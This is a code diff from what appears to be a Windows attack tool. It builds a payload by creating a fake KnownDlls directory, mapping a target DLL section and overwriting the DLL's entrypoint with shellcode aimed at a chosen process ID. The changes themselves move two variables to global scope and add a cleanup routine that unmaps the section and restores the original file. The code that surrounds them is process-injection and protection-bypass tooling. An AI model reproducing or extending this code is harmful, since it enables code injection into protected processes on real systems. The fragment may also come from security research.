@@ -179,10 +179,11 @@ bool WriteShellcode(LPCWSTR lpResourceName, PVOID pBuf, SIZE_T maxLength, DWORD&
     return true;
 }
 
+HANDLE hTargetDllSection;
+
 HANDLE CreateFakeKnownDllsDirectory(LPWSTR DllFullPath, LPWSTR* ppwszTargetFile)
 {
     HANDLE hFakeDir = NULL;
-    HANDLE hTargetDllSection = NULL;
     HANDLE hFile = INVALID_HANDLE_VALUE;
     HANDLE hSection = NULL;
     UNICODE_STRING dirName;
@@ -218,6 +219,8 @@ HANDLE CreateFakeKnownDllsDirectory(LPWSTR DllFullPath, LPWSTR* ppwszTargetFile)
     PrintVerbose(L"Fake directory handle for inheritance: %p\n", hFakeDir);
     return hFakeDir;
 }
+
+LPWSTR pwszTargetFile;
 
 // Find DLL entrypoint and overwrite it with shellcode
 bool BuildPayload(
@@ -281,7 +284,6 @@ bool BuildPayload(
 
     params.mySize = curOffset + sizeof(params);
     params.dwPid = dwTargetProcessId;
-    LPWSTR pwszTargetFile = NULL;
     params.DirHandle = CreateFakeKnownDllsDirectory(pwszDllPath, &pwszTargetFile);
     LPCWSTR pwszBaseName = pwszTargetFile;
     LPCWSTR lastBackslash = wcsrchr(pwszTargetFile, L'\\');
@@ -297,4 +299,12 @@ bool BuildPayload(
     payloadBuffer = std::move(buf);
 
     return true;
+}
+
+void CleanupPayload()
+{
+	if (hTargetDllSection)
+		UnmapDll(hTargetDllSection);
+	if (pwszTargetFile)
+		RestoreOriginalFile(pwszTargetFile);
 }
